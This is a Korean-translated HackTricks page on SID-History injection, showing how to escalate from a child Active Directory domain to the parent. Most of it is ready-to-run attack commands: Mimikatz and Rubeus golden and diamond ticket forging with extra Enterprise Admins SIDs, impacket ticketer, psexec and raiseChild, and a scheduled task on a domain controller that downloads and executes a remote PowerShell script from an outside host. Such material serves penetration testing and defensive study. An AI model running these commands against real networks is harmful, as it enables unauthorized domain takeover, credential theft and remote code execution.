# SID-History Injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## SID History Injection 공격

**SID History Injection 공격**의 목적은 **도메인 간 사용자 이동**을 지원하면서 이전 도메인의 리소스에 대한 계속된 액세스를 보장하는 것입니다. 이는 사용자의 이전 보안 식별자(SID)를 새 계정의 SID History에 통합함으로써 달성됩니다. 특히, 이 과정은 상위 권한 그룹(예: Enterprise Admins 또는 Domain Admins)의 SID를 부모 도메인의 SID History에 추가함으로써 무단 액세스를 부여하는 데 조작될 수 있습니다. 이 취약점을 이용하면 부모 도메인 내의 모든 리소스에 액세스할 수 있습니다.

이 공격을 실행하기 위해 **Golden Ticket** 또는 **Diamond Ticket**을 생성하는 두 가지 방법이 있습니다.

**"Enterprise Admins"** 그룹의 SID를 찾기 위해 먼저 루트 도메인의 SID를 찾아야 합니다. 식별 후, Enterprise Admins 그룹의 SID는 루트 도메인의 SID에 `-519`를 추가하여 구성할 수 있습니다. 예를 들어, 루트 도메인의 SID가 `S-1-5-21-280534878-1496970234-700767426`인 경우, "Enterprise Admins" 그룹의 결과 SID는 `S-1-5-21-280534878-1496970234-700767426-519`가 됩니다.

또는 **Domain Admins** 그룹을 사용할 수도 있으며, 이 그룹의 SID는 **512**로 끝납니다.

다른 도메인의 그룹(SID 예: "Domain Admins")의 SID를 찾는 또 다른 방법은 다음과 같습니다:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### KRBTGT-AES256을 사용한 골든 티켓 (Mimikatz)

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

골든 티켓에 대한 자세한 정보는 다음을 참조하십시오:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### 다이아몬드 티켓 (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

다이아몬드 티켓에 대한 자세한 정보는 다음을 참조하십시오:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

감염된 도메인의 KRBTGT 해시를 사용하여 루트 또는 Enterprise 관리자로 승격하십시오:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

공격으로 획득한 권한으로 새 도메인에서 DCSync 공격을 실행할 수 있습니다:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### 리눅스에서

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)를 사용한 수동 방법

{% code overflow="wrap" %}
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)를 사용하여 자동화하기

이것은 자식 도메인에서 부모 도메인으로 **스케일 업을 자동화하는 Impacket 스크립트**입니다. 이 스크립트는 다음을 필요로 합니다:

* 대상 도메인 컨트롤러
* 자식 도메인의 관리자 사용자의 자격 증명

흐름은 다음과 같습니다:

* 부모 도메인의 Enterprise Admins 그룹의 SID를 가져옵니다.
* 자식 도메인의 KRBTGT 계정의 해시를 검색합니다.
* Golden Ticket을 생성합니다.
* 부모 도메인에 로그인합니다.
* 부모 도메인의 Administrator 계정의 자격 증명을 검색합니다.
* `target-exec` 스위치가 지정된 경우, Psexec를 통해 부모 도메인의 도메인 컨트롤러에 인증합니다.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 참고 자료
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
